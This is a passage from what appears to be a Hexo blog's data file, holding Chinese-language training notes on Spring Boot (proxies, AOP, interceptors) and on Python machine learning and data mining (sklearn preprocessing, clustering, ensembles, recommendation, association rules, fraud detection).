中模块化的单元是切面。\n\n切面支持跨多种类型和对象的关注点（例如事务管理）的模块化。\n\nSpring IOC 容器不依赖 AOP，AOP 补充了 Spring IOC 以提供非常强大的中间件解决方案。\n\n## 顺序问题\n\n- 从 Spring Framework 5.2.7 开始，同一个切面类中定义的需要在同一个连接点运行的通知方法根据通知类型的优先级由高到低排序：@Around，@Before，@After，@AfterRunning，@AfterThrowing。\n- 当同一个类中定义两条相同类型的 Advice 时，执行顺序是未定义的（不应该有多条相同的 Advice）。\n- 不同切面类可以通过 Order 决定顺序，值越小优先级越高。\n\n# 拦截器\n\nSpring MVC 可以使用拦截器对请求进行拦截处理，用户可以自定义拦截器实现特定功能，自定义拦截器必须实现 HandlerInterceptor 接口。\n\n拦截器方法执行顺序：\n\npreHandle -> handle -> postHandle -> render -> afterCompletion\n","slug":"2022/09/SpringBoot培训2022","published":1,"updated":"2022-09-26T14:59:54.704Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj4001xzge3em5n7gff","content":"<p>2022 年 SpringBoot 培训记录。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Spring-核心原理\"><a href=\"#Spring-核心原理\" class=\"headerlink\" title=\"Spring 核心原理\"></a>Spring 核心原理</h1><h2 id=\"简化开发的几个策略\"><a href=\"#简化开发的几个策略\" class=\"headerlink\" title=\"简化开发的几个策略\"></a>简化开发的几个策略</h2><ol>\n<li>基于 pojo 的轻量级和最小侵入性编程</li>\n<li>通过依赖注入和面向接口松耦合</li>\n<li>基于切面和注解进行声明式编程</li>\n<li>通过切面和模版减少样板式代码</li>\n</ol>\n<h2 id=\"代理模式\"><a href=\"#代理模式\" class=\"headerlink\" title=\"代理模式\"></a>代理模式</h2><p>将被代理类包装起来然后重新实现相同的方法，并且调用原来方法的同时可以在方法前后添加一个新的处理。</p>\n<ul>\n<li>这种代理模式可以使用继承或组合来使用，当调用时需要使用的是代理类的对象。</li>\n<li>通过继承被代理对象，重写被代理类方法，可以对其进行代理，被代理类无需实现接口。</li>\n<li>被代理类和代理类都需要实现相同接口，被代理类作为代理类的组合属性成员传入。</li>\n<li>静态代理：静态编码定义代理类。</li>\n<li>动态代理：动态生成代理类。使用反射和字节码，在运行期间创建指定接口或类的子类以及它的实例对象的一项技术，通过此技术可以对代码进行无侵入式的增强。<ul>\n<li><strong>JDK 动态代理</strong>：java.lang.reflect 包中的 Proxy 类和 InvocationHandler 接口提供了生成动态代理类的能力。</li>\n<li><strong>CGLIB 动态代理</strong>：第三方代码生成类库，运行时在内存中动态生成一个子类对象（通过继承方式）从而实现对目标对象功能的拓展。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Bean-的拓展接口\"><a href=\"#Bean-的拓展接口\" class=\"headerlink\" title=\"Bean 的拓展接口\"></a>Bean 的拓展接口</h2><ul>\n<li>BeanPostProcessor：Bean 级别、针对具体的 Bean 进行处理，默认对 Spring 容器的所有 Bean 进行处理。</li>\n<li>BeanFactoryPostProcessor：对 BeanDefinition 对象进行修改，针对 Bean 容器，在当前 BeanFactory 初始化后、Bean 实例化之前修改 Bean 的定义属性。</li>\n</ul>\n<h1 id=\"面向切面-AOP\"><a href=\"#面向切面-AOP\" class=\"headerlink\" title=\"面向切面 AOP\"></a>面向切面 AOP</h1><p>面向切面编程（AOP）通过提供另一种思考程序结构的方式来补充面向对象编程（OOP）。</p>\n<p>OOP 中模块化的关键单元是类，AOP 中模块化的单元是切面。</p>\n<p>切面支持跨多种类型和对象的关注点（例如事务管理）的模块化。</p>\n<p>Spring IOC 容器不依赖 AOP，AOP 补充了 Spring IOC 以提供非常强大的中间件解决方案。</p>\n<h2 id=\"顺序问题\"><a href=\"#顺序问题\" class=\"headerlink\" title=\"顺序问题\"></a>顺序问题</h2><ul>\n<li>从 Spring Framework 5.2.7 开始，同一个切面类中定义的需要在同一个连接点运行的通知方法根据通知类型的优先级由高到低排序：@Around，@Before，@After，@AfterRunning，@AfterThrowing。</li>\n<li>当同一个类中定义两条相同类型的 Advice 时，执行顺序是未定义的（不应该有多条相同的 Advice）。</li>\n<li>不同切面类可以通过 Order 决定顺序，值越小优先级越高。</li>\n</ul>\n<h1 id=\"拦截器\"><a href=\"#拦截器\" class=\"headerlink\" title=\"拦截器\"></a>拦截器</h1><p>Spring MVC 可以使用拦截器对请求进行拦截处理，用户可以自定义拦截器实现特定功能，自定义拦截器必须实现 HandlerInterceptor 接口。</p>\n<p>拦截器方法执行顺序：</p>\n<p>preHandle -&gt; handle -&gt; postHandle -&gt; render -&gt; afterCompletion</p>\n","site":{"data":{}},"excerpt":"<p>2022 年 SpringBoot 培训记录。</p>","more":"<h1 id=\"Spring-核心原理\"><a href=\"#Spring-核心原理\" class=\"headerlink\" title=\"Spring 核心原理\"></a>Spring 核心原理</h1><h2 id=\"简化开发的几个策略\"><a href=\"#简化开发的几个策略\" class=\"headerlink\" title=\"简化开发的几个策略\"></a>简化开发的几个策略</h2><ol>\n<li>基于 pojo 的轻量级和最小侵入性编程</li>\n<li>通过依赖注入和面向接口松耦合</li>\n<li>基于切面和注解进行声明式编程</li>\n<li>通过切面和模版减少样板式代码</li>\n</ol>\n<h2 id=\"代理模式\"><a href=\"#代理模式\" class=\"headerlink\" title=\"代理模式\"></a>代理模式</h2><p>将被代理类包装起来然后重新实现相同的方法，并且调用原来方法的同时可以在方法前后添加一个新的处理。</p>\n<ul>\n<li>这种代理模式可以使用继承或组合来使用，当调用时需要使用的是代理类的对象。</li>\n<li>通过继承被代理对象，重写被代理类方法，可以对其进行代理，被代理类无需实现接口。</li>\n<li>被代理类和代理类都需要实现相同接口，被代理类作为代理类的组合属性成员传入。</li>\n<li>静态代理：静态编码定义代理类。</li>\n<li>动态代理：动态生成代理类。使用反射和字节码，在运行期间创建指定接口或类的子类以及它的实例对象的一项技术，通过此技术可以对代码进行无侵入式的增强。<ul>\n<li><strong>JDK 动态代理</strong>：java.lang.reflect 包中的 Proxy 类和 InvocationHandler 接口提供了生成动态代理类的能力。</li>\n<li><strong>CGLIB 动态代理</strong>：第三方代码生成类库，运行时在内存中动态生成一个子类对象（通过继承方式）从而实现对目标对象功能的拓展。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Bean-的拓展接口\"><a href=\"#Bean-的拓展接口\" class=\"headerlink\" title=\"Bean 的拓展接口\"></a>Bean 的拓展接口</h2><ul>\n<li>BeanPostProcessor：Bean 级别、针对具体的 Bean 进行处理，默认对 Spring 容器的所有 Bean 进行处理。</li>\n<li>BeanFactoryPostProcessor：对 BeanDefinition 对象进行修改，针对 Bean 容器，在当前 BeanFactory 初始化后、Bean 实例化之前修改 Bean 的定义属性。</li>\n</ul>\n<h1 id=\"面向切面-AOP\"><a href=\"#面向切面-AOP\" class=\"headerlink\" title=\"面向切面 AOP\"></a>面向切面 AOP</h1><p>面向切面编程（AOP）通过提供另一种思考程序结构的方式来补充面向对象编程（OOP）。</p>\n<p>OOP 中模块化的关键单元是类，AOP 中模块化的单元是切面。</p>\n<p>切面支持跨多种类型和对象的关注点（例如事务管理）的模块化。</p>\n<p>Spring IOC 容器不依赖 AOP，AOP 补充了 Spring IOC 以提供非常强大的中间件解决方案。</p>\n<h2 id=\"顺序问题\"><a href=\"#顺序问题\" class=\"headerlink\" title=\"顺序问题\"></a>顺序问题</h2><ul>\n<li>从 Spring Framework 5.2.7 开始，同一个切面类中定义的需要在同一个连接点运行的通知方法根据通知类型的优先级由高到低排序：@Around，@Before，@After，@AfterRunning，@AfterThrowing。</li>\n<li>当同一个类中定义两条相同类型的 Advice 时，执行顺序是未定义的（不应该有多条相同的 Advice）。</li>\n<li>不同切面类可以通过 Order 决定顺序，值越小优先级越高。</li>\n</ul>\n<h1 id=\"拦截器\"><a href=\"#拦截器\" class=\"headerlink\" title=\"拦截器\"></a>拦截器</h1><p>Spring MVC 可以使用拦截器对请求进行拦截处理，用户可以自定义拦截器实现特定功能，自定义拦截器必须实现 HandlerInterceptor 接口。</p>\n<p>拦截器方法执行顺序：</p>\n<p>preHandle -&gt; handle -&gt; postHandle -&gt; render -&gt; afterCompletion</p>"},{"layout":"pages","title":"python机器学习与数据挖掘培训","date":"2022-08-05T01:14:04.000Z","_content":"\n2022 年数据挖掘培训记录。\n\n<!--more-->\n\nDARPA AI：四个阶段五大领域\n\n- 语音识别（语音交互等）\n- 环境感知（图像识别等）\n- AI 技术（深度学习等）\n- 机器人自主控制\n- 群组协同\n\nAI 技术的目标是复制或超越计算机系统中需要人类智能的部分。\n\n# 机器学习的学习方式\n\n- 有监督学习\n  - 每个训练样本包括输入特征 x 和输出 y（标记）\n  - 总结规律，预测答案\n  - 具体技术：决策树，支持向量机，朴素贝叶斯，回归预测\n- 无监督学习\n  - 训练样本只有 x 没有 y\n  - 可以总结特征的一些规律，但是无法知道答案 y\n  - 具体技术：聚类（k-means），关联规则（apriori）\n- 半监督学习\n  - 先用无监督学习先做一些聚类，让模型总结相似\n  - 再用少量的带标注的训练样本，告诉模型对应的答案\n  - 模型最后把相似的样本对应到标记\n- 强化学习\n  - 主要特点：试错学习，延迟反馈，时间是重要因素，当前的行为影响后续接收到的数据\n  - 基本组成：Agent（智能体），Environment（环境），State（状态），Action（行动），Reward（奖励），Value（价值）\n\n# 机器学习模型\n\n- 聚类/分类/回归（基于 sklearn）\n- 决策树\n- 智能推荐算法\n- 关联规则\n\n# 数据预处理\n\n1. 使用 sklearn 转换器处理数据\n2. 构建并评价聚类模型\n3. 构建并评价分类模型\n4. 构建并评价回归模型\n\n## 将数据集划分为训练集和测试集\n\n典型划分方式是训练集 50%，验证集和测试集各占 25%。\n\n- 当数据总量较少时，常用方法是留少部分做测试集，然后对其余样本采用 K 折交叉验证法。\n- tran_test_split 函数\n\n## 使用 sklearn 转换器进行数据预处理与降维\n\n使用 sklearn 转换器能够实现对传入的 numpy 数组进行标准化处理、归一化处理、二值化处理、PCA 降维等操作，主要包括 3 个方法。\n\n- fit\n- transform\n- fit_transform\n\n在数据分析过程中，各类特征处理相关的操作都需要对训练集和测试集分开操作，需要将训练集的操作规则权重系数等应用到测试集中。\n\n- MinMaxScaler\n- StandardScaler\n- Normalizer\n- Binarizer\n- OneHotEncoder\n- FunctionTransformer\n\nPCA 降维算法函数。\n\n- n_componnets\n- copy\n- whiten\n- svd_solver\n\n## 使用 sklearn 估计器构建聚类模型\n\n算法类别：\n\n- 划分（分裂）方法：K-Means 算法（K-平均）、K-MEDOIDS 算法（K-中心点）、CLARANS 算法（基于选择的算法）\n- 层次分析算法：BIRCH 算法（平衡迭代规约和聚类）、CURE 算法（代表点聚类）、CHAMEleon 算法（动态模型）\n- 基于密度的方法：DBSCAN 算法（基于高密度连接区域）、DENCLUE 算法（密度分布函数）、OPTICS 算法（对象排序识别）\n- 基于网格的算法：STING 算法（统计信息网络）、CLIOUE 算法（聚类高维空间）、WAVE-CLUSTER 算法（小波变换）\n\n常用的聚类算法模块 cluster。\n\n# 决策树\n\n决策树是机器学习中一种基本的分类和回归算法，是依托于策略抉择而建立起来的树。\n\n## 随机森林\n\n随机森林是通过机器学习的思想将多棵树集成的一种算法，它的基本单元是决策树，本质属于集成学习（Ensemble Learning）方法。\n\n# Xgboost 算法\n\n根据各个弱分类器之间有无依赖关系，分为：\n\n- Boosting 流派，各分类器之间有依赖关系，必须串行，如 Adaboost、GBDT（Gradient Boosting Decision Tree）、Xgboost\n- Bagging 流派，各分类器之间没有依赖关系，可各自并行，如随机森林（Random Forest）\n\n# 智能推荐算法\n\n具体主流模型\n\n1. 协同过滤算法（Collaborate Filtering）\n   1. 基于对用户历史行为数据的挖掘发现用户的喜好偏向，并预测用户可能喜好的 item（产品，服务）进行推荐\n   2. 主要实现：\n      - 根据有共同喜好的人进行推荐\n      - 根据喜好的 item 推荐相似 item\n      - 根据以上条件综合推荐\n   3. 常用算法分为两种：\n      - 基于用户的协同过滤算法（userCF）\n      - 基于物品的协同过滤算法（itemCF）\n2. 隐语义模型（Latent Factor Model）\n   1. 对所有的 item（产品，文档）进行分类，再根据用户的兴趣分类给用户推荐该分类中的 item\n   2. 模型的主要工作：\n      - 给 item 分类\n      - 确定用户兴趣（特征）属于哪些类及感兴趣程度\n      - 对于用户感兴趣的类，具体推荐哪些 item 给用户\n3. 图\n   1. 以 Personal Rank 为例，将用户行为数据用二分图表示，例如用户数据是由一系列的二元组组成，其中每个元组（u，i）表示用户 u 对物品 i 产生过行为\n\n# 关联规则\n\n是反映一个事物与其他事物之间的相互依存性和关联性。\n\n常用于实体电商或在线电商的推荐系统：通过对顾客的购买记录数据库进行关联规则挖掘，最终目的是发现顾客群体的购买习惯的内在共性。\n\n关键概念：\n\n1. 支持度（Support）\n\n- 两件商品（X∩Y）在总销售笔数（N）中出现的概率\n\n2. 置信度（Confidence）\n\n- 购买 X 后再购买 Y 的条件概率\n\n3. 提升度（Lift）\n\n- 表示先购买 X 对购买 Y 的概率的提升作用，用来判断规则是否有实际价值\n\n# 机器学习应用\n\n## 金融反欺诈：检测，响应，预防\n\n应用实践：\n\n1. 利用设备指纹技术对设备和身份进行初步识别\n2. 基于非监督式的异常检测，将数据分解为正常趋势、随机扰动和异常情况三个部分\n3. 在第 2 基础上实现画像，对设备、网络和用户三个层面的“千人千面”\n4. 基于生成式概率模型的特征学习，形成了统一的多层特征模型\n5. 将各个维度的特征统一成一种单位，归一化处理便于模型和人工对欺诈风险进行综合评估，规避传统静态规则的灵活性差的问题\n6. 基于图模型学习的欺诈网络识别，利用高效的图聚类和社交网络算法，对欺诈网络进行动态地实时识别\n\n实例：账户盗用检测、支付欺诈监测、内容滥用监测、营销推广滥用监测。\n\n## 文本分类分析\n\n把文档转为向量，按复杂性排序：\n\n1. 加载文档，切词，NLP\n2. 将切词结果转为词汇库（编号，出现频次）\n3. 对切词结果进行清洗，转为精简词汇库（出现与否）\n\n# 示例代码库\n\nhttps://github.com/Ashestar/python_data_mining\n","source":"_posts/2022/08/python机器学习与数据挖掘培训.md","raw":"---\nlayout: pages\ntitle: python机器学习与数据挖掘培训\ndate: 2022-08-05 09:14:04\ntags:\n  - 培训\n  - 机器学习\n  - python\ncategories:\n  - 培训\n  - 机器学习\n---\n\n2022 年数据挖掘培训记录。\n\n<!--more-->\n\nDARPA AI：四个阶段五大领域\n\n- 语音识别（语音交互等）\n- 环境感知（图像识别等）\n- AI 技术（深度学习等）\n- 机器人自主控制\n- 群组协同\n\nAI 技术的目标是复制或超越计算机系统中需要人类智能的部分。\n\n# 机器学习的学习方式\n\n- 有监督学习\n  - 每个训练样本包括输入特征 x 和输出 y（标记）\n  - 总结规律，预测答案\n  - 具体技术：决策树，支持向量机，朴素贝叶斯，回归预测\n- 无监督学习\n  - 训练样本只有 x 没有 y\n  - 可以总结特征的一些规律，但是无法知道答案 y\n  - 具体技术：聚类（k-means），关联规则（apriori）\n- 半监督学习\n  - 先用无监督学习先做一些聚类，让模型总结相似\n  - 再用少量的带标注的训练样本，告诉模型对应的答案\n  - 模型最后把相似的样本对应到标记\n- 强化学习\n  - 主要特点：试错学习，延迟反馈，时间是重要因素，当前的行为影响后续接收到的数据\n  - 基本组成：Agent（智能体），Environment（环境），State（状态），Action（行动），Reward（奖励），Value（价值）\n\n# 机器学习模型\n\n- 聚类/分类/回归（基于 sklearn）\n- 决策树\n- 智能推荐算法\n- 关联规则\n\n# 数据预处理\n\n1. 使用 sklearn 转换器处理数据\n2. 构建并评价聚类模型\n3. 构建并评价分类模型\n4. 构建并评价回归模型\n\n## 将数据集划分为训练集和测试集\n\n典型划分方式是训练集 50%，验证集和测试集各占 25%。\n\n- 当数据总量较少时，常用方法是留少部分做测试集，然后对其余样本采用 K 折交叉验证法。\n- tran_test_split 函数\n\n## 使用 sklearn 转换器进行数据预处理与降维\n\n使用 sklearn 转换器能够实现对传入的 numpy 数组进行标准化处理、归一化处理、二值化处理、PCA 降维等操作，主要包括 3 个方法。\n\n- fit\n- transform\n- fit_transform\n\n在数据分析过程中，各类特征处理相关的操作都需要对训练集和测试集分开操作，需要将训练集的操作规则权重系数等应用到测试集中。\n\n- MinMaxScaler\n- StandardScaler\n- Normalizer\n- Binarizer\n- OneHotEncoder\n- FunctionTransformer\n\nPCA 降维算法函数。\n\n- n_componnets\n- copy\n- whiten\n- svd_solver\n\n## 使用 sklearn 估计器构建聚类模型\n\n算法类别：\n\n- 划分（分裂）方法：K-Means 算法（K-平均）、K-MEDOIDS 算法（K-中心点）、CLARANS 算法（基于选择的算法）\n- 层次分析算法：BIRCH 算法（平衡迭代规约和聚类）、CURE 算法（代表点聚类）、CHAMEleon 算法（动态模型）\n- 基于密度的方法：DBSCAN 算法（基于高密度连接区域）、DENCLUE 算法（密度分布函数）、OPTICS 算法（对象排序识别）\n- 基于网格的算法：STING 算法（统计信息网络）、CLIOUE 算法（聚类高维空间）、WAVE-CLUSTER 算法（小波变换）\n\n常用的聚类算法模块 cluster。\n\n# 决策树\n\n决策树是机器学习中一种基本的分类和回归算法，是依托于策略抉择而建立起来的树。\n\n## 随机森林\n\n随机森林是通过机器学习的思想将多棵树集成的一种算法，它的基本单元是决策树，本质属于集成学习（Ensemble Learning）方法。\n\n# Xgboost 算法\n\n根据各个弱分类器之间有无依赖关系，分为：\n\n- Boosting 流派，各分类器之间有依赖关系，必须串行，如 Adaboost、GBDT（Gradient Boosting Decision Tree）、Xgboost\n- Bagging 流派，各分类器之间没有依赖关系，可各自并行，如随机森林（Random Forest）\n\n# 智能推荐算法\n\n具体主流模型\n\n1. 协同过滤算法（Collaborate Filtering）\n   1. 基于对用户历史行为数据的挖掘发现用户的喜好偏向，并预测用户可能喜好的 item（产品，服务）进行推荐\n   2. 主要实现：\n      - 根据有共同喜好的人进行推荐\n      - 根据喜好的 item 推荐相似 item\n      - 根据以上条件综合推荐\n   3. 常用算法分为两种：\n      - 基于用户的协同过滤算法（userCF）\n      - 基于物品的协同过滤算法（itemCF）\n2. 隐语义模型（Latent Factor Model）\n   1. 对所有的 item（产品，文档）进行分类，再根据用户的兴趣分类给用户推荐该分类中的 item\n   2. 模型的主要工作：\n      - 给 item 分类\n      - 确定用户兴趣（特征）属于哪些类及感兴趣程度\n      - 对于用户感兴趣的类，具体推荐哪些 item 给用户\n3. 图\n   1. 以 Personal Rank 为例，将用户行为数据用二分图表示，例如用户数据是由一系列的二元组组成，其中每个元组（u，i）表示用户 u 对物品 i 产生过行为\n\n# 关联规则\n\n是反映一个事物与其他事物之间的相互依存性和关联性。\n\n常用于实体电商或在线电商的推荐系统：通过对顾客的购买记录数据库进行关联规则挖掘，最终目的是发现顾客群体的购买习惯的内在共性。\n\n关键概念：\n\n1. 支持度（Support）\n\n- 两件商品（X∩Y）在总销售笔数（N）中出现的概率\n\n2. 置信度（Confidence）\n\n- 购买 X 后再购买 Y 的条件概率\n\n3. 提升度（Lift）\n\n- 表示先购买 X 对购买 Y 的概率的提升作用，用来判断规则是否有实际价值\n\n# 机器学习应用\n\n## 金融反欺诈：检测，响应，预防\n\n应用实践：\n\n1. 利用设备指纹技术对设备和身份进行初步识别\n2. 基于非监督式的异常检测，将数据分解为正常趋势、随机扰动和异常情况三个部分\n3. 在第 2 基础上实现画像，对设备、网络和用户三个层面的“千人千面”\n4. 基于生成式概率模型的特征学习，形成了统一的多层特征模型\n5. 将各个维度的特征统一成一种单位，归一化处理便于模型和人工对欺诈风险进行综合评估，规避传统静态规则的灵活性差的问题\n6. 基于图模型学习的欺诈网络识别，利用高效的图聚类和社交网络算法，对欺诈网络进行动态地实时识别\n\n实例：账户盗用检测、支付欺诈监测、内容滥用监测、营销推广滥用监测。\n\n## 文本分类分析\n\n把文档转为向量，按复杂性排序：\n\n1. 加载文档，切词，NLP\n2. 将切词结果转为词汇库（编号，出现频次）\n3. 对切词结果进行清洗，转为精简词汇库（出现与否）\n\n# 示例代码库\n\nhttps://github.com/Ashestar/python_data_mining\n","slug":"2022/08/python机器学习与数据挖掘培训","published":1,"updated":"2022-09-26T15:01:13.640Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj50020zge31qon8lkp","content":"<p>2022 年数据挖掘培训记录。</p>\n<span id=\"more\"></span>\n\n<p>DARPA AI：四个阶段五大领域</p>\n<ul>\n<li>语音识别（语音交互等）</li>\n<li>环境感知（图像识别等）</li>\n<li>AI 技术（深度学习等）</li>\n<li>机器人自主控制</li>\n<li>群组协同</li>\n</ul>\n<p>AI 技术的目标是复制或超越计算机系统中需要人类智能的部分。</p>\n<h1 id=\"机器学习的学习方式\"><a href=\"#机器学习的学习方式\" class=\"headerlink\" title=\"机器学习的学习方式\"></a>机器学习的学习方式</h1><ul>\n<li>有监督学习<ul>\n<li>每个训练样本包括输入特征 x 和输出 y（标记）</li>\n<li>总结规律，预测答案</li>\n<li>具体技术：决策树，支持向量机，朴素贝叶斯，回归预测</li>\n</ul>\n</li>\n<li>无监督学习<ul>\n<li>训练样本只有 x 没有 y</li>\n<li>可以总结特征的一些规律，但是无法知道答案 y</li>\n<li>具体技术：聚类（k-means），关联规则（apriori）</li>\n</ul>\n</li>\n<li>半监督学习<ul>\n<li>先用无监督学习先做一些聚类，让模型总结相似</li>\n<li>再用少量的带标注的训练样本，告诉模型对应的答案</li>\n<li>模型最后把相似的样本对应到标记</li>\n</ul>\n</li>\n<li>强化学习<ul>\n<li>主要特点：试错学习，延迟反馈，时间是重要因素，当前的行为影响后续接收到的数据</li>\n<li>基本组成：Agent（智能体），Environment（环境），State（状态），Action（行动），Reward（奖励），Value（价值）</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"机器学习模型\"><a href=\"#机器学习模型\" class=\"headerlink\" title=\"机器学习模型\"></a>机器学习模型</h1><ul>\n<li>聚类&#x2F;分类&#x2F;回归（基于 sklearn）</li>\n<li>决策树</li>\n<li>智能推荐算法</li>\n<li>关联规则</li>\n</ul>\n<h1 id=\"数据预处理\"><a href=\"#数据预处理\" class=\"headerlink\" title=\"数据预处理\"></a>数据预处理</h1><ol>\n<li>使用 sklearn 转换器处理数据</li>\n<li>构建并评价聚类模型</li>\n<li>构建并评价分类模型</li>\n<li>构建并评价回归模型</li>\n</ol>\n<h2 id=\"将数据集划分为训练集和测试集\"><a href=\"#将数据集划分为训练集和测试集\" class=\"headerlink\" title=\"将数据集划分为训练集和测试集\"></a>将数据集划分为训练集和测试集</h2><p>典型划分方式是训练集 50%，验证集和测试集各占 25%。</p>\n<ul>\n<li>当数据总量较少时，常用方法是留少部分做测试集，然后对其余样本采用 K 折交叉验证法。</li>\n<li>tran_test_split 函数</li>\n</ul>\n<h2 id=\"使用-sklearn-转换器进行数据预处理与降维\"><a href=\"#使用-sklearn-转换器进行数据预处理与降维\" class=\"headerlink\" title=\"使用 sklearn 转换器进行数据预处理与降维\"></a>使用 sklearn 转换器进行数据预处理与降维</h2><p>使用 sklearn 转换器能够实现对传入的 numpy 数组进行标准化处理、归一化处理、二值化处理、PCA 降维等操作，主要包括 3 个方法。</p>\n<ul>\n<li>fit</li>\n<li>transform</li>\n<li>fit_transform</li>\n</ul>\n<p>在数据分析过程中，各类特征处理相关的操作都需要对训练集和测试集分开操作，需要将训练集的操作规则权重系数等应用到测试集中。</p>\n<ul>\n<li>MinMaxScaler</li>\n<li>StandardScaler</li>\n<li>Normalizer</li>\n<li>Binarizer</li>\n<li>OneHotEncoder</li>\n<li>FunctionTransformer</li>\n</ul>\n<p>PCA 降维算法函数。</p>\n<ul>\n<li>n_componnets</li>\n<li>copy</li>\n<li>whiten</li>\n<li>svd_solver</li>\n</ul>\n<h2 id=\"使用-sklearn-估计器构建聚类模型\"><a href=\"#使用-sklearn-估计器构建聚类模型\" class=\"headerlink\" title=\"使用 sklearn 估计器构建聚类模型\"></a>使用 sklearn 估计器构建聚类模型</h2><p>算法类别：</p>\n<ul>\n<li>划分（分裂）方法：K-Means 算法（K-平均）、K-MEDOIDS 算法（K-中心点）、CLARANS 算法（基于选择的算法）</li>\n<li>层次分析算法：BIRCH 算法（平衡迭代规约和聚类）、CURE 算法（代表点聚类）、CHAMEleon 算法（动态模型）</li>\n<li>基于密度的方法：DBSCAN 算法（基于高密度连接区域）、DENCLUE 算法（密度分布函数）、OPTICS 算法（对象排序识别）</li>\n<li>基于网格的算法：STING 算法（统计信息网络）、CLIOUE 算法（聚类高维空间）、WAVE-CLUSTER 算法（小波变换）</li>\n</ul>\n<p>常用的聚类算法模块 cluster。</p>\n<h1 id=\"决策树\"><a href=\"#决策树\" class=\"headerlink\" title=\"决策树\"></a>决策树</h1><p>决策树是机器学习中一种基本的分类和回归算法，是依托于策略抉择而建立起来的树。</p>\n<h2 id=\"随机森林\"><a href=\"#随机森林\" class=\"headerlink\" title=\"随机森林\"></a>随机森林</h2><p>随机森林是通过机器学习的思想将多棵树集成的一种算法，它的基本单元是决策树，本质属于集成学习（Ensemble Learning）方法。</p>\n<h1 id=\"Xgboost-算法\"><a href=\"#Xgboost-算法\" class=\"headerlink\" title=\"Xgboost 算法\"></a>Xgboost 算法</h1><p>根据各个弱分类器之间有无依赖关系，分为：</p>\n<ul>\n<li>Boosting 流派，各分类器之间有依赖关系，必须串行，如 Adaboost、GBDT（Gradient Boosting Decision Tree）、Xgboost</li>\n<li>Bagging 流派，各分类器之间没有依赖关系，可各自并行，如随机森林（Random Forest）</li>\n</ul>\n<h1 id=\"智能推荐算法\"><a href=\"#智能推荐算法\" class=\"headerlink\" title=\"智能推荐算法\"></a>智能推荐算法</h1><p>具体主流模型</p>\n<ol>\n<li>协同过滤算法（Collaborate Filtering）<ol>\n<li>基于对用户历史行为数据的挖掘发现用户的喜好偏向，并预测用户可能喜好的 item（产品，服务）进行推荐</li>\n<li>主要实现：<ul>\n<li>根据有共同喜好的人进行推荐</li>\n<li>根据喜好的 item 推荐相似 item</li>\n<li>根据以上条件综合推荐</li>\n</ul>\n</li>\n<li>常用算法分为两种：<ul>\n<li>基于用户的协同过滤算法（userCF）</li>\n<li>基于物品的协同过滤算法（itemCF）</li>\n</ul>\n</li>\n</ol>\n</li>\n<li>隐语义模型（Latent Factor Model）<ol>\n<li>对所有的 item（产品，文档）进行分类，再根据用户的兴趣分类给用户推荐该分类中的 item</li>\n<li>模型的主要工作：<ul>\n<li>给 item 分类</li>\n<li>确定用户兴趣（特征）属于哪些类及感兴趣程度</li>\n<li>对于用户感兴趣的类，具体推荐哪些 item 给用户</li>\n</ul>\n</li>\n</ol>\n</li>\n<li>图<ol>\n<li>以 Personal Rank 为例，将用户行为数据用二分图表示，例如用户数据是由一系列的二元组组成，其中每个元组（u，i）表示用户 u 对物品 i 产生过行为</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"关联规则\"><a href=\"#关联规则\" class=\"headerlink\" title=\"关联规则\"></a>关联规则</h1><p>是反映一个事物与其他事物之间的相互依存性和关联性。</p>\n<p>常用于实体电商或在线电商的推荐系统：通过对顾客的购买记录数据库进行关联规则挖掘，最终目的是发现顾客群体的购买习惯的内在共性。</p>\n<p>关键概念：</p>\n<ol>\n<li>支持度（Support）</li>\n</ol>\n<ul>\n<li>两件商品（X∩Y）在总销售笔数（N）中出现的概率</li>\n</ul>\n<ol start=\"2\">\n<li>置信度（Confidence）</li>\n</ol>\n<ul>\n<li>购买 X 后再购买 Y 的条件概率</li>\n</ul>\n<ol start=\"3\">\n<li>提升度（Lift）</li>\n</ol>\n<ul>\n<li>表示先购买 X 对购买 Y 的概率的提升作用，用来判断规则是否有实际价值</li>\n</ul>\n<h1 id=\"机器学习应用\"><a href=\"#机器学习应用\" class=\"headerlink\" title=\"机器学习应用\"></a>机器学习应用</h1><h2 id=\"金融反欺诈：检测，响应，预防\"><a href=\"#金融反欺诈：检测，响应，预防\" class=\"headerlink\" title=\"金融反欺诈：检测，响应，预防\"></a>金融反欺诈：检测，响应，预防</h2><p>应用实践：</p>\n<ol>\n<li>利用设备指纹技术对设备和身份进行初步识别</li>\n<li>基于非监督式的异常检测，将数据分解为正常趋势、随机扰动和异常情况三个部分</li>\n<li>在第 2 基础上实现画像，对设备、网络和用户三个层面的“千人千面”</li>\n<li>基于生成式概率模型的特征学习，形成了统一的多层特征模型</li>\n<li>将各个维度的特征统一成一种单位，归一化处理便于模型和人工对欺诈风险进行综合评估，规避传统静态规则的灵活性差的问题</li>\n<li>基于图模型学习的欺诈网络识别，利用高效的图聚类和社交网络算法，对欺诈网络进行动态地实时识别</li>\n</ol>\n<p>实例：账户盗用检测、支付欺诈监测、内容滥用监测、营销推广滥用监测。</p>\n<h2 id=\"文本分类分析\"><a href=\"#文本分类分析\" class=\"headerlink\" title=\"文本分类分析\"></a>文本分类分析</h2><p>把文档转为向量，按复杂性排序：</p>\n<ol>\n<li>加载文档，切词，NLP</li>\n<li>将切词结果转为词汇库（编号，出现频次）</li>\n<li>对切词结果进行清洗，转为精简词汇库（出现与否）</li>\n</ol>\n<h1 id=\"示例代码库\"><a href=\"#示例代码库\" class=\"headerlink\" title=\"示例代码库\"></a>示例代码库</h1><p><a href=\"https://github.com/Ashestar/python_data_mining\">https://github.com/Ashestar/python_data_mining</a></p>\n","site":{"data":{}},"excerpt":"<p>2022 年数据挖掘培训记录。</p>","more":"<p>DARPA AI：四个阶段五大领域</p>\n<ul>\n<li>语音识别（语音交互等）</li>\n<li>环境感知（图像识别等）</li>\n<li>AI 技术（深度学习等）</li>\n<li>机器人自主控制</li>\n<li>群组协同</li>\n</ul>\n<p>AI 技术的目标是复制或超越计算机系统中需要人类智能的部分。</p>\n<h1 id=\"机器学习的学习方式\"><a href=\"#机器学习的学习方式\" class=\"headerlink\" title=\"机器学习的学习方式\"></a>机器学习的学习方式</h1><ul>\n<li>有监督学习<ul>\n<li>每个训练样本包括输入特征 x 和输出 